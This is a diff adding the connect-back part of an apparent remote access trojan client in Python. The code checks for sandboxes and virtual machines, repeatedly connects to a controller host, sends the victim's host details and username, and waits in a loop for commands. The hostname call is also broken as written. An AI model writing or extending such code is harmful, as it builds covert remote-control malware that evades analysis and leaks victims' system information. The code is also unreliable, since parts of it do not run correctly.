@@ -36,3 +36,43 @@ def detectVM():
         if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
             return " (Virtual Machine) "
     return ""
+
+def server_connect():
+    global obj_socket
+
+    while True:
+        try:
+            obj_socket = socket.socket()
+            obj_socket.connect((strHost, intPort))
+
+        except socket.error:
+            time.sleep(5)  #after 5 second will try again
+
+        else: break
+
+    str_user_info = socket.gethostbyname() + "'," + platform.system() + "  " + platform.release() + detectSandboxie() + detectVM() + "', " + os.environ["USERNAME"]
+    send(str.encode(str_user_info))
+
+decode_utf8 = lambda data: data.decode("utf-8")
+
+recv = lambda buffer: obj_socket.recv(buffer)
+
+send = lambda data: obj_socket.send(data)
+
+server_connect()
+
+while True:
+    try:
+        while True:
+            str_data = recv(intBuff)
+            str_data = decode_utf8(str_data)
+
+            if str_data == "exit":
+                obj_socket.close()
+                sys.exit(0)
+
+    except socket.error:
+        obj_socket.close()
+        del obj_socket
+
+        server_connect()
